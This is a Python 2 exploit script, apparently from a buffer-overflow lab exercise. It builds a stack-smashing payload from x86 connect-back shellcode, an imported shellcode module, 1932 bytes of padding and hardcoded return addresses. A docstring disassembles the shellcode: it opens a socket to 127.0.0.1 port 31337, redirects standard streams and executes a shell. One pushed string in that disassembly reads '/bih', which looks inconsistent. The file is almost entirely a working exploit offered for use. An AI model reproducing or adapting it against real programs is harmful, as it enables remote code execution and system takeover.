from struct import pack
from shellcode import shellcode
print "\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\xff\xff\xff\xff\xbb\x80\xff\xff\xfe\x31\xc3\x53\x66\x68\x7a\x69\x66\x6a\x02\x31\xc0\x50\x40\x50\x40\x50\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc3\x31\xc0\x50\xb0\x10\x50\x89\xe8\x83\xe8\x10\x50\x53\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x8b\x1c\x24\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6" + shellcode + '\x61'*1932 + pack("<I", 0xbffed758) + pack("<I", 0xbffedf6c)

"""
Disassembly of section .text:

00000000 <dup-0x53>:
   0:	89 e5                	mov    %esp,%ebp
   2:	31 c0                	xor    %eax,%eax
   4:	31 c9                	xor    %ecx,%ecx
   6:	31 d2                	xor    %edx,%edx
   8:	50                   	push   %eax
   9:	50                   	push   %eax
   a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   f:	bb 80 ff ff fe       	mov    $0xfeffff80,%ebx
  14:	31 c3                	xor    %eax,%ebx
  16:	53                   	push   %ebx
  17:	66 68 7a 69          	pushw  $0x697a
  1b:	66 6a 02             	pushw  $0x2
  1e:	31 c0                	xor    %eax,%eax
  20:	50                   	push   %eax
  21:	40                   	inc    %eax
  22:	50                   	push   %eax
  23:	40                   	inc    %eax
  24:	50                   	push   %eax
  25:	31 c0                	xor    %eax,%eax
  27:	31 db                	xor    %ebx,%ebx
  29:	b0 66                	mov    $0x66,%al
  2b:	b3 01                	mov    $0x1,%bl
  2d:	89 e1                	mov    %esp,%ecx
  2f:	cd 80                	int    $0x80
  31:	89 c3                	mov    %eax,%ebx
  33:	31 c0                	xor    %eax,%eax
  35:	50                   	push   %eax
  36:	b0 10                	mov    $0x10,%al
  38:	50                   	push   %eax
  39:	89 e8                	mov    %ebp,%eax
  3b:	83 e8 10             	sub    $0x10,%eax
  3e:	50                   	push   %eax
  3f:	53                   	push   %ebx
  40:	31 c0                	xor    %eax,%eax
  42:	31 db                	xor    %ebx,%ebx
  44:	b0 66                	mov    $0x66,%al
  46:	b3 03                	mov    $0x3,%bl
  48:	89 e1                	mov    %esp,%ecx
  4a:	cd 80                	int    $0x80
  4c:	8b 1c 24             	mov    (%esp),%ebx
  4f:	31 c9                	xor    %ecx,%ecx
  51:	b1 03                	mov    $0x3,%cl

00000053 <dup>:
  53:	31 c0                	xor    %eax,%eax
  55:	b0 3f                	mov    $0x3f,%al
  57:	49                   	dec    %ecx
  58:	cd 80                	int    $0x80
  5a:	41                   	inc    %ecx
  5b:	e2 f6                	loop   53 <dup>
  5d:	31 c0                	xor    %eax,%eax
  5f:	31 d2                	xor    %edx,%edx
  61:	50                   	push   %eax
  62:	68 2f 2f 73 68       	push   $0x68732f2f
  67:	68 2f 62 69 68       	push   $0x6869622f
  6c:	89 e3                	mov    %esp,%ebx
  6e:	b0 0b                	mov    $0xb,%al
  70:	cd 80                	int    $0x80
"""
